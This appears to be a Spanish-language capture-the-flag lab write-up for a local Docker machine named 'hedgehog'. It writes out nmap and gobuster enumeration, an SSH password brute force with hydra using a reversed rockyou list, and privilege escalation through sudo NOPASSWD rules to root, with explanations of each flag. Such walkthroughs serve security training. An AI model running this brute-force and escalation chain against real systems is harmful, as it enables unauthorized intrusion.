```bash
unzip hedgehog.zip
```
```bash
sudo bash auto_deploy.sh hedgehog.tar

#comprobacion ip
ping -c 1 ip
ping -c 1 ip -R
nmap -sn ip

#escaneo
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2

```

![[Pasted image 20260126171555.png]]

```bash
nmap -p 22,80 -A 172.17.0.2 -vvv
```
![[Pasted image 20260126171702.png]]

```bash
curl http://172.17.0.2
```

![[Pasted image 20260126171739.png]]

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```
![[Pasted image 20260126171952.png]]

![[Pasted image 20260126172017.png]]


posible usuario tails?

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x .php


gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```

```bash
tac /usr/share/wordlists/rockyou.txt > reversa_rockyou.txt
head reversa_rockyou.txt

```

### ¿Qué hace `tac`?

- `tac` es **cat al revés**

Pero notamos que hay espacios y fuera de sitio en los elementos que contiene el nuevo archivo en reversa que se generó. Por lo que debemos realizar el siguiente comando:


```bash
tac /usr/share/wordlists/rockyou.txt | sed 's/^[[:space:]]*//' > reversa_rockyou.txt

```

### ¿Qué es `sed`?

- Editor de flujo (stream editor).
- Modifica texto línea por línea.

![[Pasted image 20260126173700.png]]

Ejecutando hydra:
```bash
hydra -l tails -P reversa_rockyou.txt ssh://172.17.0.2 -I -f
```
## `I` (mayúscula)

### ¿Qué hace?

- **Ignora sesiones previas.**
- No reanuda ataques antiguos.
- Fuerza un **inicio limpio.**

📌 Útil cuando:

- Cambió el diccionario.
- Cambió el objetivo.
- Hubo falsos positivos antes.

---

## -`f`

### Parámetro crítico

- **Finaliza el ataque al encontrar una credencial válida.**
- “Fail fast”.

🎯 Ventajas:

- Menos ruido.
- Menos intentos.
- Menor probabilidad de bloqueo.
- Ideal en entornos con IDS / Fail2Ban.

📌 Mentalidad profesional:

> “No necesito romper todo, solo entrar una vez.”

![[Pasted image 20260126173843.png]]

```bash
ssh tails@172.17.0.2
```
![[Pasted image 20260126173946.png]]
```bash
cat /etc/passwd
```
![[Pasted image 20260126174013.png]]

![[Pasted image 20260126174048.png]]

host afectado: cda7315fba99
Significa:

> El usuario tails puede ejecutar comandos como el usuario sonic.

📌 No como root directamente, pero **eso no es una limitación real**, ahora veremos por qué.
### 🔹 `NOPASSWD`

Significa:

> No se requiere contraseña para usar sudo.

### 🔹 `ALL`

Significa:

> Cualquier comando, sin restricciones.

tails puede convertirse en sonic instantáneamente y ejecutar cualquier cosa.

Cambiamos al usuario sonic y a la vez solicitamos ejecutar el comando bash.

```bash
sudo -u sonic /bin/bash

```
![[Pasted image 20260126174335.png]]

Nos percatamos que ahora estamos con un user que pertenece al grupo de sudores, y que podemos tener el control total del equipo, subiendo de esta manera de privilegios dentro de la máquina víctima.

```bash
sudo -l

sudo bash
```
![[Pasted image 20260126174540.png]]


![[Pasted image 20260126174510.png]]
